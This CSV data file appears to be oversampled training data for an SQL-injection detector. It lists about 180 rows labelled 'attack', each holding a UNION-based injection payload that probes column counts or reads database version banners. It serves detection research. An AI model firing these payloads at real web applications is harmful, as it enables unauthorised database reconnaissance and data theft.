id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000021,attack,union,"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",nearest_attack_euclidean,R001338,0.27342242953218493
SMOTE_000022,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000748,0.3326607872832824
SMOTE_000023,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000484,0.16733012817007364
SMOTE_000024,attack,union,"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",nearest_attack_euclidean,R001652,0.13597966510375667
SMOTE_000025,attack,union,"1 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001420,0.08713639047985225
SMOTE_000026,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,0.34661384981774923
SMOTE_000027,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001286,0.7727738960172041
SMOTE_000028,attack,union,"-5496 union all select 2099,2099,2099#",nearest_attack_euclidean,R001270,0.4037035295767904
SMOTE_000029,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R001177,0.35042526860323703
SMOTE_000030,attack,union,"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",nearest_attack_euclidean,R001511,0.2106770295903739
SMOTE_000031,attack,union,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",nearest_attack_euclidean,R000383,0.3691816767669916
SMOTE_000032,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000664,0.2681366463441517
SMOTE_000033,attack,union,"-2605%'   )    )     )   union all select 4738,4738#",nearest_attack_euclidean,R000847,0.030145474657528242
SMOTE_000034,attack,union,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",nearest_attack_euclidean,R001558,0.32660176690201287
SMOTE_000035,attack,union,"1""   )    )    as eglv where 7412  =  7412 union all select null#",nearest_attack_euclidean,R000291,0.2735473843062943
SMOTE_000036,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000418,0.05952757073974867
SMOTE_000037,attack,union,"-8869"" where 3019  =  3019 union all select 3019,3019,3019#",nearest_attack_euclidean,R001343,0.6581672388424453
SMOTE_000038,attack,union,"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001564,0.31301633487157016
SMOTE_000039,attack,union,"-1438 where 6759  =  6759 union all select 6759,6759#",nearest_attack_euclidean,R000287,0.5452313304598543
SMOTE_000040,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R001470,0.23925518469475174
SMOTE_000041,attack,union,"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",nearest_attack_euclidean,R001146,0.9334823457723365
SMOTE_000042,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000834,0.35782754468941874
SMOTE_000043,attack,union,"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000468,0.276957269029391
SMOTE_000044,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000606,0.20116441479910918
SMOTE_000045,attack,union,"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001309,1.1521218731524825
SMOTE_000046,attack,union,"-4127%' union all select 9558,9558,9558#",nearest_attack_euclidean,R001548,0.38807858575141035
SMOTE_000047,attack,union,"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",nearest_attack_euclidean,R001145,0.42862325359233067
SMOTE_000048,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,0.25385905994539143
SMOTE_000049,attack,union,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",nearest_attack_euclidean,R000663,0.3547399876954259
SMOTE_000050,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000159,0.14210216393589972
SMOTE_000051,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000046,0.026443456390546884
SMOTE_000052,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.377120848052879
SMOTE_000053,attack,union,"-8021""  )   union all select 1166,1166,1166,1166--",nearest_attack_euclidean,R001647,0.004228326708018708
SMOTE_000054,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R001122,0.012444256903002866
SMOTE_000055,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001418,0.038047707708828746
SMOTE_000056,attack,union,"-1438 where 6759  =  6759 union all select 6759,6759#",nearest_attack_euclidean,R000287,0.542833524929521
SMOTE_000057,attack,union,"1' in boolean mode  )   union all select null,null#",nearest_attack_euclidean,R000881,0.0568993853463948
SMOTE_000058,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.25082080415398106
SMOTE_000059,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000381,1.0212224198145508
SMOTE_000060,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000732,0.0
SMOTE_000061,attack,union,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",nearest_attack_euclidean,R000577,0.06899972500624679
SMOTE_000062,attack,union,"-3391' union all select 2024,2024--",nearest_attack_euclidean,R000228,0.007024238553899065
SMOTE_000063,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R000414,0.007034082793345949
SMOTE_000064,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000040,0.002269480224265036
SMOTE_000065,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R001052,0.14716935139761173
SMOTE_000066,attack,union,"1%' union all select null,null--",nearest_attack_euclidean,R000927,0.13310333298293003
SMOTE_000067,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R000859,0.24055603144998813
SMOTE_000068,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000639,0.21799661320438263
SMOTE_000069,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,0.2569515741607143
SMOTE_000070,attack,union,"1%"" union all select null,null,null,null,null--",nearest_attack_euclidean,R001434,0.08026914272481703
SMOTE_000071,attack,union,"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",nearest_attack_euclidean,R001107,0.36815359582046164
SMOTE_000072,attack,union,"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",nearest_attack_euclidean,R000925,0.3182309384185517
SMOTE_000073,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R001052,0.2782155605685855
SMOTE_000074,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000139,0.37473255880578304
SMOTE_000075,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,0.2524689109766098
SMOTE_000076,attack,union," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000069,0.12474627764503012
SMOTE_000077,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000091,0.20812368855256658
SMOTE_000078,attack,union,"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000379,0.06400577029227415
SMOTE_000079,attack,union,1%'   )    )     )   union all select null--,nearest_attack_euclidean,R000898,0.5895181890113429
SMOTE_000080,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R001200,0.3073693701520303
SMOTE_000081,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R001238,0.16073247055808118
SMOTE_000082,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R001592,0.018741837252210798
SMOTE_000083,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R001052,0.1481897163616425
SMOTE_000084,attack,union,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",nearest_attack_euclidean,R001325,0.181473194147711
SMOTE_000085,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000682,0.5787776858958528
SMOTE_000086,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000606,0.3901277584686975
SMOTE_000087,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000132,1.3133620237289123
SMOTE_000088,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000268,0.3352446599004429
SMOTE_000089,attack,union,1   )    )    union all select null#,nearest_attack_euclidean,R001096,0.4738528182058982
SMOTE_000090,attack,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000116,0.0873823796908967
SMOTE_000091,attack,union,"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",nearest_attack_euclidean,R001338,0.7308778706010729
SMOTE_000092,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000178,0.6422140429313462
SMOTE_000093,attack,union,"1""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000746,0.3109441744908594
SMOTE_000094,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001279,0.264707261337442
SMOTE_000095,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R001335,0.1519244506007836
SMOTE_000096,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000661,0.06899755154117657
SMOTE_000097,attack,union,"-8893%'  )   union all select 1254,1254--",nearest_attack_euclidean,R000529,0.5769504432802062
SMOTE_000098,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,0.2738208694582285
SMOTE_000099,attack,union,-6473' union all select 7537#,nearest_attack_euclidean,R001282,0.45629857826770626
SMOTE_000100,attack,union,"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000363,0.24925587281822167
SMOTE_000101,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001326,0.40717097320907036
SMOTE_000102,attack,union,"1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000900,0.18351530686457146
SMOTE_000103,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.08014415925434774
SMOTE_000104,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001057,0.20219136924557962
SMOTE_000105,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,0.22559545410361267
SMOTE_000106,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R001560,0.33813086388702396
SMOTE_000107,attack,union,"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",nearest_attack_euclidean,R000405,0.5711596420253047
SMOTE_000108,attack,union,"1'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001099,0.30616745351781793
SMOTE_000109,attack,union,"1   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R000432,0.7134300597032951
SMOTE_000110,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000489,0.24527987876807691
SMOTE_000111,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001529,0.03394999073060019
SMOTE_000112,attack,union,"-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",nearest_attack_euclidean,R000238,0.11622410730945991
SMOTE_000113,attack,union,"-7138"" union all select 2341,2341,2341,2341--",nearest_attack_euclidean,R001291,0.4045439427859396
SMOTE_000114,attack,union,"-8794   )    )     )   union all select 5802,5802,5802--",nearest_attack_euclidean,R001207,0.16580774218826197
SMOTE_000115,attack,union,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",nearest_attack_euclidean,R001385,0.30074479870957677
SMOTE_000116,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001642,0.762196242126397
SMOTE_000117,attack,union,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",nearest_attack_euclidean,R001098,0.020674283784684496
SMOTE_000118,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,0.3915454076139122
SMOTE_000119,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000835,0.5528297690526103
SMOTE_000120,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,0.16841331908987026
SMOTE_000121,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,2.9200193199910854e-07
SMOTE_000122,attack,union,"-2434  )   union all select 8310,8310,8310,8310,8310--",nearest_attack_euclidean,R000754,0.0044741635578556685
SMOTE_000123,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.23048974264261077
SMOTE_000124,attack,union,-8378%'  )   union all select 5491#,nearest_attack_euclidean,R001535,0.5389782585212926
SMOTE_000125,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000445,0.01701819810772514
SMOTE_000126,attack,union," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000148,0.29761653427041773
SMOTE_000127,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.0
SMOTE_000128,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.0
SMOTE_000129,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000586,0.2171974883112315
SMOTE_000130,attack,union,"1"" where 8241  =  8241 union all select null,null,null#",nearest_attack_euclidean,R000509,1.2626938717897005
SMOTE_000131,attack,union,1%'  )   union all select null#,nearest_attack_euclidean,R000818,0.33457731075607006
SMOTE_000132,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000387,0.12452028274870601
SMOTE_000133,attack,union,"-3781  )   union all select 3916,3916,3916--",nearest_attack_euclidean,R001006,0.08348768368895804
SMOTE_000134,attack,union,"-2365   )    )    union all select 8190,8190#",nearest_attack_euclidean,R001634,0.45430728307565243
SMOTE_000135,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000346,0.06999601017522644
SMOTE_000136,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,0.031219307693680722
SMOTE_000137,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000434,0.46372817443530034
SMOTE_000138,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001645,0.3012699636034474
SMOTE_000139,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000318,0.07447510369179935
SMOTE_000140,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000590,0.07022444588650502
SMOTE_000141,attack,union,"-7111 union all select 2409,2409,2409,2409,2409,2409#",nearest_attack_euclidean,R001235,0.2423404971956365
SMOTE_000142,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000782,0.3564230360443254
SMOTE_000143,attack,union,"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",nearest_attack_euclidean,R001276,0.28483108289439757
SMOTE_000144,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000303,0.00012582649217386294
SMOTE_000145,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R001271,0.037169787572026276
SMOTE_000146,attack,union,"-1432""   )    )    union all select 9008,9008,9008#",nearest_attack_euclidean,R001064,0.051597834634559
SMOTE_000147,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.0
SMOTE_000148,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000195,2.0297449505593423
SMOTE_000149,attack,union,"-7255' union all select 2127,2127,2127,2127,2127#",nearest_attack_euclidean,R000546,0.36261474511817765
SMOTE_000150,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R001187,0.1524018881016118
SMOTE_000151,attack,union,"-3955 where 7276  =  7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",nearest_attack_euclidean,R001010,0.0438861776374994
SMOTE_000152,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.061621891195670714
SMOTE_000153,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001129,0.4388887587564076
SMOTE_000154,attack,union,"-4473'  )   union all select 7656,7656#",nearest_attack_euclidean,R001485,0.38723996140229855
SMOTE_000155,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R001380,0.2041492247989327
SMOTE_000156,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001137,0.1600325728036628
SMOTE_000157,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001415,0.37020108491808557
SMOTE_000158,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000730,0.2651632673229661
SMOTE_000159,attack,union,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",nearest_attack_euclidean,R001100,0.40497998203094865
SMOTE_000160,attack,union,"1 where 2292  =  2292 union all select null,null,null,null#",nearest_attack_euclidean,R000951,0.06133341744336663
SMOTE_000161,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R000669,0.37715503637911413
SMOTE_000162,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000332,0.11622714800446302
SMOTE_000163,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000473,0.06252139380414266
SMOTE_000164,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000346,0.3375461534130692
SMOTE_000165,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000977,0.24467367740324591
SMOTE_000166,attack,union,"-8414%""  )   union all select 2795#",nearest_attack_euclidean,R001175,0.46087296651825777
SMOTE_000167,attack,union,"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",nearest_attack_euclidean,R000553,0.1442226855180903
SMOTE_000168,attack,union,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",nearest_attack_euclidean,R001623,0.08669232558373667
SMOTE_000169,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000126,0.040575206020099217
SMOTE_000170,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001597,0.38363130293602726
SMOTE_000171,attack,union,"-8358'   )    )     )   union all select 7282,7282--",nearest_attack_euclidean,R001364,0.08338710714061175
SMOTE_000172,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000245,0.30914190478707143
SMOTE_000173,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R001154,0.15924109245075252
SMOTE_000174,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R001615,0.004699493967482785
SMOTE_000175,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000251,0.1995412010418935
SMOTE_000176,attack,union,"-5572""  )   union all select 8131,8131#",nearest_attack_euclidean,R000411,0.8323325464236433
SMOTE_000177,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000863,0.1184762764157222
SMOTE_000178,attack,union," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000154,0.07384412855404908
SMOTE_000179,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001289,0.1790565996683261
SMOTE_000180,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001571,0.03787484177648459
SMOTE_000181,attack,union,-6190'   )    )     )   union all select 9413--,nearest_attack_euclidean,R000673,0.008316305062970661
SMOTE_000182,attack,union,"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001433,0.2468849617415939
SMOTE_000183,attack,union,"-8893%'  )   union all select 1254,1254--",nearest_attack_euclidean,R000529,0.11585721849335594
SMOTE_000184,attack,union,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000636,0.1841678269144576
SMOTE_000185,attack,union,"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",nearest_attack_euclidean,R000386,0.7379974551243006
SMOTE_000186,attack,union,"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",nearest_attack_euclidean,R001192,0.3873722860925528
SMOTE_000187,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000241,0.41811864222072687
SMOTE_000188,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000302,0.03325398310149828
SMOTE_000189,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R001188,0.11124715932943875
SMOTE_000190,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.11644604409235697
SMOTE_000191,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000528,0.3948131589798171
SMOTE_000192,attack,union,-4171'  )   union all select 6136#,nearest_attack_euclidean,R001446,0.010846277078411294
SMOTE_000193,attack,union,"1%'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001497,0.6526585176991117
SMOTE_000194,attack,union,"1'  )   as jysm where 8961  =  8961 union all select null,null#",nearest_attack_euclidean,R000699,0.33176736723393613
SMOTE_000195,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R001312,0.38175202367996397
SMOTE_000196,attack,union,"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001148,0.23159453369672178
SMOTE_000197,attack,union,"1%""   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R001144,0.05044944258669328
SMOTE_000198,attack,union,"1"" union all select null,null,null,null--",nearest_attack_euclidean,R000283,0.2802063307968919
